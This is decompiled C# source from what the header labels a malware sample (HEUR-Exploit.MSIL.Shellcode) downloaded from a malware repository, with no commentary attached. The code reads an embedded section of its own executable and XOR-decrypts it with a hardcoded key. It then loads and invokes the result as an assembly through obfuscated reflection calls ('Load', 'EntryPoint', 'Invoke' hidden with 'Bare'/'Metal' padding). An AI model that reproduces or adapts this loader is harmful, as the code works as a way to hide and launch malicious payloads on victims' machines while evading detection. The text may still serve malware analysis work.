// Decompiled with JetBrains decompiler
// Type: 300458769105
// Assembly: 087135227926, Version=10.0.0.0, Culture=neutral, PublicKeyToken=30ad4fe6b2a6aeed
// MVID: 0DB320EA-9C28-4716-BA63-69641BABDE67
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Exploit.MSIL.Shellcode.gen-3283830ccf60d4481608cb301a1e81f6b89bd02ff08e41f6034488bc28baf010.exe

using \u003305316230596;
using Microsoft.VisualBasic;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

public class \u003300458769105
{
  public static unsafe void \u003135956136307()
  {
    \u003371248361424.\u003C739003020993\u003E();
    "PRIYATNO".ToString();
    byte* hinstance = (byte*) (void*) Marshal.GetHINSTANCE(typeof (\u003300458769105).Module);
    byte* numPtr1 = hinstance + *(uint*) (hinstance + 60);
    uint num1 = *(short*) (numPtr1 + 24) != (short) 523 ? *(uint*) (numPtr1 + 168) : *(uint*) (numPtr1 + 184);
    byte* numPtr2 = hinstance + num1;
    uint length = *(uint*) (numPtr2 + 16);
    uint num2 = *(uint*) (numPtr2 + 20);
    byte* numPtr3 = numPtr2 - num1;
    byte[] numArray = new byte[(int) length];
    byte* numPtr4 = numPtr3 + num2;
    fixed (byte* numPtr5 = &numArray[0])
    {
      for (int index = 0; index < numArray.Length; ++index)
        numPtr5[index] = numPtr4[index];
    }
    \u003300458769105.\u003C367566155571\u003E(\u003300458769105.\u003C552027100511\u003E(numArray, "737541047301"));
  }

  [CompilerGenerated]
  public static void \u003C367566155571\u003E(byte[] _param0)
  {
    object obj1 = (object) string.Empty;
    foreach (string str1 in \u003300458769105.\u003C710512177105\u003E())
    {
      string empty = string.Empty;
      string str2 = str1.Replace("Bare", string.Empty).Replace("Metal", string.Empty);
      object obj2 = obj1;
      string str3 = str2;
      int num = str2.StartsWith("I") ? 1 : 2;
      object[] objArray;
      if (!str2.StartsWith("L"))
      {
        if (!str2.StartsWith("I"))
          objArray = (object[]) null;
        else
          objArray = new object[2]{ (object) false, null };
      }
      else
        objArray = new object[1]{ (object) _param0 };
      // ISSUE: reference to a compiler-generated field
      // ISSUE: cast to a function pointer type
      // ISSUE: function pointer call
      obj1 = __calli((__FnPtr<object (object, string, CallType, object[])>) \u003165411198507.\u003521915760370.\u003557334857977.\u003477267205281[0])((object[]) obj2, (CallType) str3, (string) num, (object) objArray);
    }
  }

  [CompilerGenerated]
  public static List<string> \u003C710512177105\u003E() => new List<string>()
  {
    "GetBareTypeMetal",
    "BareAsseMetalmbly",
    "MetalLoBaread",
    "MetalEntryBarePoint",
    "MetalInBarevoke"
  };

  [CompilerGenerated]
  public static byte[] \u003C552027100511\u003E(byte[] _param0, string _param1)
  {
    byte[] numArray = new byte[_param0.Length];
    for (int index = 0; index < _param0.Length; ++index)
      numArray[index] = (byte) ((uint) _param0[index] ^ (uint) _param1[index % _param1.Length]);
    return numArray;
  }
}
